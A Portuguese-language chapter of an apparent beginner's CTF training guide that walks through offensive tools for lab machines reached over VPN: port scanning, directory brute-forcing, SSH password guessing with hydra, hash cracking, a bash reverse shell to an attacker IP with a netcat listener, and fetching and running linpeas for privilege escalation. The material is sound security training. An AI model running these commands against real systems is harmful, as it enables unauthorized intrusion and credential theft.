# 3. Ferramentas

[⬅ Redes e Web](02-redes-e-web.md) · [Sumário](README.md) · [Próximo: Primeiras invasões guiadas ➡](04-primeiras-invasoes-guiadas.md)

## Por que isso vem agora

Agora que você sabe **o que** procurar (portas, serviços, páginas), precisa saber **como** procurar rápido. Cada ferramenta abaixo resolve uma etapa da invasão. Todas já estão no seu Kali por causa do Ansible.

Em todos os exemplos, troque `<IP>` pelo IP do alvo e `<MEU_IP>` pelo seu IP na VPN (`ip a show tun0`).

## Antes de tudo: o navegador certo

O alvo só é alcançável pela VPN, e a VPN está ligada **dentro do Kali**. Por isso, o Chrome/Edge do Windows normalmente **não consegue** abrir o site do alvo. Use o Firefox de dentro do Kali:

```bash
kex --win -s
```

Isso abre a área de trabalho do Kali numa janela. Lá dentro, abra o Firefox e o terminal.

## O mapa: qual ferramenta para qual etapa

```
1. Reconhecimento      →  nmap                (quais portas estão abertas?)
2. Enumeração web      →  gobuster, navegador, burp (que páginas e falhas o site tem?)
3. Senhas              →  hydra, john         (adivinhar login / quebrar hash)
4. Acesso inicial      →  exploit, shell reverso, searchsploit, metasploit
5. Escalação           →  sudo -l, SUID, linpeas (virar root)
```

## 1. Nmap: descobrir portas abertas

O Nmap "bate em todas as portas" do alvo e diz quais estão abertas e o que roda nelas.

```bash
nmap -sC -sV <IP>
```

- `-sC`: roda scripts padrão que já mostram informações óbvias (login anônimo no FTP, título do site...).
- `-sV`: descobre o nome e a versão de cada serviço.

Isso olha só as 1000 portas mais comuns. Às vezes o desafio esconde um serviço numa porta estranha. Então, **sempre** rode também:

```bash
nmap -p- --min-rate 1000 <IP>
```

- `-p-`: todas as 65.535 portas.
- `--min-rate 1000`: vai mais rápido.

Se aparecer uma porta nova, rode `nmap -sC -sV -p <porta> <IP>` só nela.

Exemplo de resultado e como ler:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

Leitura: "tem SSH (vou precisar de usuário e senha) e um site Apache. Vou começar pelo site."

## 2. Gobuster: achar páginas escondidas

O Gobuster testa milhares de nomes de pasta (`/admin`, `/backup`, `/uploads`...) para ver quais existem.

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

- `dir`: modo de procurar pastas e arquivos.
- `-u`: a URL do alvo.
- `-w`: a wordlist (lista de nomes para testar).

Se não achar nada interessante, use uma lista maior e procure também extensões:

```bash
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html
```

Achou uma pasta? Rode o Gobuster **de novo dentro dela** (`-u http://<IP>/pasta`).

## 3. Burp Suite: ver e mexer no que o navegador envia

O Burp fica "no meio" entre o navegador e o site e deixa você ver e **alterar** cada requisição antes de ela sair. Serve para burlar formulários, mexer em cookies e testar falhas.

Abra pelo `kex --win -s` (rode `burpsuite` no terminal de lá) e use o navegador que já vem dentro do Burp (aba **Proxy → Open browser**). Assim você não precisa configurar proxy.

## 4. Hydra: adivinhar senhas de login

O Hydra testa senhas de uma wordlist contra um serviço até uma funcionar.

```bash
hydra -l joao -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

- `-l joao`: um usuário só (use `-L arquivo.txt` para uma lista de usuários).
- `-P`: a lista de senhas. A `rockyou.txt` tem 14 milhões de senhas vazadas de verdade.

**Só use força bruta quando tiver um usuário certo e algum motivo** (uma dica da sala, um nome achado no site). Força bruta às cegas demora horas e quase nunca é o caminho em CTF fácil.

## 5. John the Ripper: quebrar hashes

Achou um hash (uma senha embaralhada, tipo `5f4dcc3b5aa765d61d8327deb882cf99`)? Salve num arquivo e:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

O John embaralha cada senha da wordlist do mesmo jeito e compara. Se bater, achou.

Coisas protegidas por senha (ZIP, chave SSH) primeiro viram hash com as ferramentas `*2john`:

```bash
zip2john arquivo.zip > hash.txt
ssh2john id_rsa > hash.txt
```

Não sabe que tipo de hash é? Cole em [crackstation.net](https://crackstation.net) primeiro: se for uma senha comum, ele já responde.

## 6. Shell reverso: ganhar um terminal no alvo

Quando você consegue fazer o alvo **rodar um comando** (por uma falha no site, por exemplo), o próximo passo é transformar isso num terminal de verdade. Para isso, o alvo se conecta **de volta** em você.

**No seu Kali**, deixe uma porta esperando:

```bash
nc -lvnp 4444
```

**No alvo** (pela falha), rode um comando que conecta em você. O mais comum:

```bash
bash -c 'bash -i >& /dev/tcp/<MEU_IP>/4444 0>&1'
```

Dica: rodando `rlwrap nc -lvnp 4444` no lugar, as setas e o histórico já funcionam no shell que chegar.

Se o terminal do `nc` mostrar um prompt, você está dentro. Para ele ficar mais estável (setas, Tab, `Ctrl+C` sem cair):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# aperte Ctrl+Z
stty raw -echo; fg
# aperte Enter duas vezes
export TERM=xterm
```

Não decore os comandos de shell reverso. Use o [revshells.com](https://www.revshells.com): você coloca seu IP e porta e ele gera o comando para cada linguagem (PHP, Python, bash...). Para upload de arquivo PHP, o Kali já tem um pronto em `/usr/share/webshells/php/php-reverse-shell.php` (edite o IP e a porta dentro dele).

## 7. Searchsploit e Metasploit: usar falhas conhecidas

O Nmap disse a versão de um serviço? Veja se ela tem falha conhecida:

```bash
searchsploit apache 2.4.29
```

O **Metasploit** (`msfconsole`) é uma coleção de exploits prontos. Ele é bom para aprender (a sala **Blue** usa), mas em CTF fácil tente primeiro entender a falha e explorar "na mão". Você aprende muito mais.

## 8. Escalação de privilégio: virar root

Você entrou como usuário comum. Agora quer ser root. Rode isto **sempre, nesta ordem**:

```bash
sudo -l                                   # o que posso rodar como root?
find / -perm -4000 -type f 2>/dev/null    # arquivos SUID
cat /etc/crontab                          # tarefas que o root roda sozinho
ls -la /home/*                            # arquivos de outros usuários
```

Achou um programa em `sudo -l` ou na lista de SUID? Procure o nome dele no [GTFOBins](https://gtfobins.github.io). Esse site mostra como usar programas comuns (`vim`, `find`, `tar`, `python`...) para virar root. É provavelmente o site que você mais vai abrir.

Nada óbvio? Use o **linpeas**, que faz uma varredura completa e destaca em vermelho/amarelo o que é suspeito. Ele já está no seu Kali; para mandar ao alvo:

```bash
# no Kali, na pasta onde está o linpeas
cd /usr/share/peass/linpeas && python3 -m http.server 8000

# no alvo
cd /tmp && wget http://<MEU_IP>:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

## Salas desta fase (faça na ordem)

- [ ] **Active Reconnaissance** (Walkthrough): coletar informação do alvo com ping, telnet e navegador, antes do Nmap.
- [ ] **Further Nmap** (Walkthrough): o Nmap em detalhe: tipos de varredura, scripts e detecção de versão.
- [ ] **Burp Suite: The Basics** (Walkthrough): interceptar e alterar requisições.
- [ ] **Hydra** (Walkthrough): força bruta em login de site e SSH.
- [ ] **Crack the hash** (Challenge): treino de identificar e quebrar hashes.
- [ ] **Metasploit: Introduction** (Walkthrough): como usar o Metasploit.
- [ ] **Linux PrivEsc** (Walkthrough): as técnicas de escalação de privilégio uma por uma. É a única sala de nível *medium* antes da Fase 6, mas é toda guiada: vá devagar e use o GTFOBins.

## ✅ Teste: estou pronto?

- [ ] Qual comando do Nmap eu rodo primeiro? E qual eu rodo para não perder porta escondida?
- [ ] O Gobuster achou `/uploads` e `/admin`. O que eu faço com cada um?
- [ ] Quando faz sentido usar o Hydra? Quando não faz?
- [ ] Achei um arquivo `backup.zip` com senha. Quais dois comandos uso para abrir?
- [ ] Explique com suas palavras o que é um shell reverso e quem conecta em quem.
- [ ] Virei usuário comum. Quais 4 coisas eu verifico primeiro para virar root?
- [ ] Para que serve o GTFOBins?

[⬅ Redes e Web](02-redes-e-web.md) · [Sumário](README.md) · [Próximo: Primeiras invasões guiadas ➡](04-primeiras-invasoes-guiadas.md)
